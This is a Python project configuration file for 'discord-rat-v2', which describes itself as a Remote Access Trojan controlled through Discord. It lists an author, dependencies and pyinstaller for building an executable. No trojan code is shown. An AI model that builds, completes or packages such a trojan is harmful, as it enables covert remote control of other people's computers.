[project]
name = "discord-rat-v2"
version = "0.1.0"
description = "a Remote Access Trojan (RAT) written in python and paired with discord for cloud/collaborative access"
readme = "README.md"
authors = [
    { name = "TaherMustansir1929", email = "eren.jeager1929101@gmail.com" },
]
requires-python = ">=3.14"
dependencies = [
    "discord>=2.3.2",
    "python-dotenv>=1.2.4",
    "requests>=2.34.2",
]

[project.scripts]
discord-rat-v2 = "discord_rat_v2:main"

[build-system]
requires = ["uv_build>=0.12.5,<0.13.0"]
build-backend = "uv_build"

[dependency-groups]
dev = [
    "pyinstaller>=6.22.3",
]
